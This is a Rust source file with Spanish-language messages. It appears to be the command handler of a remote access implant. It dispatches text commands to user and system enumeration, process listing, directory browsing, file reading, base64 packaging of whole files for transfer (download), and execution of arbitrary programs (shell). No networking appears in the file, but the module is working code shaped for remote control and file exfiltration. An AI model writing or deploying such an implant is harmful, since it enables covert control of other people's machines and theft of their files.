use std::process::Command;
use std::env;
use sysinfo::{System, SystemExt};
use tokio::process::Command as AsyncCommand;
use base64::{Engine as _, engine::general_purpose::STANDARD};

pub async fn execute(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.is_empty() {
        return String::new();
    }
    
    match parts[0].to_lowercase().as_str() {
        "help" => help(),
        "whoami" => whoami(),
        "sysinfo" => sysinfo(),
        "ps" => ps(),
        "ls" | "dir" => dir(parts.get(1)),
        "cd" => cd(parts.get(1)),
        "pwd" => pwd(),
        "cat" | "type" => cat(parts.get(1)),
        "download" => download(parts.get(1)),
        "shell" => shell(&parts[1..]).await,
        "exit" | "quit" => "exit".to_string(),
        _ => format!("Comando no reconocido: {}\nEscribe 'help' para ayuda", parts[0]),
    }
}

fn help() -> String {
    r#"
Comandos disponibles:
  help                  - Muestra esta ayuda
  whoami                - Información del usuario
  sysinfo               - Información del sistema
  ps                    - Lista procesos
  ls/dir [path]         - Lista directorio
  cd [path]             - Cambia directorio
  pwd                   - Directorio actual
  cat/type <file>       - Muestra contenido archivo
  download <file>       - Descarga archivo (base64)
  shell <cmd>           - Ejecuta comando cmd
  exit/quit             - Salir
"#.to_string()
}

fn whoami() -> String {
    let mut info = String::new();
    
    info.push_str(&format!("Usuario: {}\n", whoami::username()));
    // CORREGIDO: usar fallible::hostname()
    info.push_str(&format!("Hostname: {}\n", whoami::fallible::hostname().unwrap_or("Unknown".to_string())));
    info.push_str(&format!("Plataforma: {}\n", whoami::platform()));
    
    // Información adicional de Windows
    if let Ok(userprofile) = env::var("USERPROFILE") {
        info.push_str(&format!("UserProfile: {}\n", userprofile));
    }
    
    if let Ok(computername) = env::var("COMPUTERNAME") {
        info.push_str(&format!("Computername: {}\n", computername));
    }
    
    info.push_str(&format!("PID: {}\n", std::process::id()));
    
    info
}

fn sysinfo() -> String {
    let sys = System::new_all();
    
    let mut info = String::new();
    
    info.push_str(&format!("Sistema: {} {}\n", 
        sys.name().unwrap_or_default(),
        sys.os_version().unwrap_or_default()));
    
    info.push_str(&format!("Kernel: {}\n", 
        sys.kernel_version().unwrap_or_default()));
    
    info.push_str(&format!("Hostname: {}\n", 
        sys.host_name().unwrap_or_default()));
    
    info.push_str(&format!("CPU: {} núcleos\n", sys.cpus().len()));
    
    let total_mem = sys.total_memory() as f64 / 1024.0 / 1024.0;
    let used_mem = sys.used_memory() as f64 / 1024.0 / 1024.0;
    info.push_str(&format!("Memoria: {:.2}/{:.2} MB\n", used_mem, total_mem));
    
    info.push_str(&format!("Procesos: {}\n", sys.processes().len()));
    
    info
}

fn ps() -> String {
    let output = Command::new("tasklist")
        .output()
        .unwrap_or_else(|_| std::process::Output {
            stdout: Vec::new(),
            stderr: b"Error ejecutando tasklist".to_vec(),
            status: std::process::ExitStatus::default(),
        });
    
    String::from_utf8_lossy(&output.stdout).to_string()
}

fn dir(path: Option<&&str>) -> String {
    let target = path.unwrap_or(&".");
    
    match std::fs::read_dir(target) {
        Ok(entries) => {
            let mut result = String::new();
            result.push_str(&format!("Directorio: {}\n", target));
            result.push_str("-------------------\n");
            
            for entry in entries.flatten() {
                let path = entry.path();
                let name = path.file_name().unwrap_or_default().to_string_lossy();
                let metadata = entry.metadata().ok();
                let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
                let is_dir = metadata.map(|m| m.is_dir()).unwrap_or(false);
                
                let file_type = if is_dir { "DIR" } else { "FILE" };
                result.push_str(&format!("{:10} {:8} {}\n", file_type, size, name));
            }
            
            result
        }
        Err(e) => format!("Error: {}\n", e),
    }
}

fn cd(path: Option<&&str>) -> String {
    match path {
        Some(dir) => {
            if let Err(e) = env::set_current_dir(dir) {
                format!("Error: {}\n", e)
            } else {
                format!("Directorio cambiado a: {}\n", dir)
            }
        }
        None => "Uso: cd <directorio>\n".to_string(),
    }
}

fn pwd() -> String {
    match env::current_dir() {
        Ok(path) => format!("{}\n", path.display()),
        Err(e) => format!("Error: {}\n", e),
    }
}

fn cat(path: Option<&&str>) -> String {
    match path {
        Some(file) => {
            match std::fs::read_to_string(file) {
                Ok(content) => {
                    if content.len() > 10000 {
                        format!("(Mostrando primeros 10KB de {} bytes)\n{}\n", 
                            content.len(), &content[..10000])
                    } else {
                        content + "\n"
                    }
                }
                Err(e) => format!("Error: {}\n", e),
            }
        }
        None => "Uso: cat <archivo>\n".to_string(),
    }
}

fn download(path: Option<&&str>) -> String {
    match path {
        Some(file) => {
            match std::fs::read(file) {
                Ok(data) => {
                    let encoded = STANDARD.encode(data);
                    format!("FILE:{}\n{}\nENDFILE", file, encoded)
                }
                Err(e) => format!("Error: {}\n", e),
            }
        }
        None => "Uso: download <archivo>\n".to_string(),
    }
}

async fn shell(args: &[&str]) -> String {
    if args.is_empty() {
        return "Uso: shell <comando>\n".to_string();
    }
    
    let cmd = args[0];
    let cmd_args = &args[1..];
    
    match AsyncCommand::new(cmd)
        .args(cmd_args)
        .output()
        .await
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            let mut result = String::new();
            if !stdout.is_empty() {
                result.push_str(&stdout);
            }
            if !stderr.is_empty() {
                result.push_str(&stderr);
            }
            
            result
        }
        Err(e) => format!("Error: {}\n", e),
    }
}